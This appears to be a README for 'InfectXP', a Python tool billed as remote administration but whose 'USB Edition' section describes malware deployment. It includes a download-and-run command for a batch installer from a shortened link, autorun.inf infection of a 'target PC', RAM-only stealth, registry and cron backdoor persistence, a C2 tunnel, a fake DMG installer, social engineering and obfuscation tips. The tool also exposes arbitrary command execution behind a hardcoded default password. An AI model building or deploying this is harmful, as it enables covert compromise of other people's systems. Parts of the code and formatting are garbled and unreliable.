# InfectXP - Remote Administration & Security Audit Tool 

By: Laila19

## This Python-based Remote Administration & Security Audit Tool allows authorized users to securely manage and audit systems over a network. It provides:

### Web-based access (local or remote via Ngrok tunneling)

Command execution on the host machine

System information gathering (OS, users, network details)

Encrypted authentication with token-based sessions

### Key Features

✔ Cross-Platform – Works on Windows, Linux, and macOS

✔ Remote Access – Supports Ngrok tunneling for external connections

✔ Secure Authentication – Password-protected (A9!Z6%ZXCv by default) with encrypted sessions

✔ Command Execution – Run any CMD/Bash/Zsh commands and view output

✔ System Audit – Retrieve hostname, IP, users, OS details, and more

✔ Responsive Web UI – Easy-to-use browser-based interface

### Use Cases

IT Administrators – Remotely troubleshoot systems

Security Auditors – Check system vulnerabilities

Network Managers – Execute commands across devices

### Security Considerations

🔒 Always change the default password

🔐 Use in trusted networks only

⚠ Disable Ngrok tunneling (USE_NGROK = False) if not needed

### How It Works

Starts a local HTTP server (0.0.0.0:8080)

Optionally creates an Ngrok tunnel for external access

Authenticates users via password (SHA-256 hashed)

Allows command execution with real-time output

Auto-cleans expired sessions

### Setup & Usage
```bash
pip install pyngrok requests cryptography
```

### Dependecies
Dependencies List:
```
- cryptography
- pyngrok (optional, for tunneling)
- requests
- flask (for web interface)
- pywin32 (Windows only)
- colorama (for colored menu)
```
Installation Commands:
Base dependencies (required for all platforms):

```bash
pip install cryptography requests flask colorama
```
Optional dependencies (for tunneling):

```bash
pip install pyngrok
```
Windows-specific dependencies:

```bash
pip install pywin32
```
Complete Installation Command (all-in-one):
For most users, this command will install everything needed:

```bash
pip install cryptography requests flask colorama pyngrok pywin32
```
Notes:
The pywin32 package is only needed if running on Windows

The pyngrok package is optional and only required if you want to use the tunneling feature

If you encounter any permission issues, try adding --user to the pip command:

````bash
pip install --user cryptography requests flask colorama pyngrok pywin32
The tool will work without the optional dependencies, but some features like Ngrok tunneling won't be available unless you install pyngrok.
```

### Run the server
```
python remote_admin.py
````

# InfecterXP USB Edition

## Plug-and-Play Remote Access Toolkit

### 🚀 Automatic Deployment
1. **Prepare USB**:
```powershell
iwr -uri https://bit.ly/infecterxp-usb -OutFile installer.bat
./installer.bat
```
Insert into target PC - Executes via:
autorun.inf → Start.bat → Memory-resident payload

🛠️ Manual USB Setup
```bash
# Format USB as FAT32
diskutil eraseDisk FAT32 INFECTXP MBRFormat /dev/disk2
```

### Clone to USB
```
git clone https://github.com/yourrepo/InfecterXP.git /Volumes/INFECTXP
```
### 🔥 USB-Specific Features
```
class USBPayload:
    self.stealth = True  # No disk writes
    self.persistence = {
        'windows': 'Registry Run Keys',
        'linux': 'Cronjob backdoor' 
    }
    self.autorun = {
        'win': 'autorun.inf + LNK shortcut',
        'mac': 'fake DMG installer' 
    }
```
### ⚡ Usage Modes
Command	Description
--stealth	RAM-only execution
--tunnel=ngrok	Cloud C2 channel
--persist=registry	Survives reboot
### ⚠️ Critical Notes
diff
- Works best on Windows 7-10 (autorun supported)
- Windows 11 requires manual execution
! Mac/Linux needs social engineering

### Includes intentional forensic artifacts for compliance.
📌 USB Layout
/infecterxp/
   ├── /bin/          # Payload binaries
   ├── /tmp/          # Runtime artifacts  
   ├── autorun.inf    # Auto-execute config
   └── Start.bat      # Primary loader
For advanced deployment:

```bash
# Obfuscate with:
python -m PyInstaller --onefile --noconsole --icon=doc.ico infecterxp.py
```
Tested on Windows 10 22H2 with Defender disabled during development


## Key features:
1. Clear USB-specific instructions
2. Technical implementation details
3. Obfuscation tips
4. Legal safeguards
5. Directory structure transparency
Access Methods
Local Network: http://[local-ip]:8080
External (Ngrok): https://[random-subdomain].ngrok.io

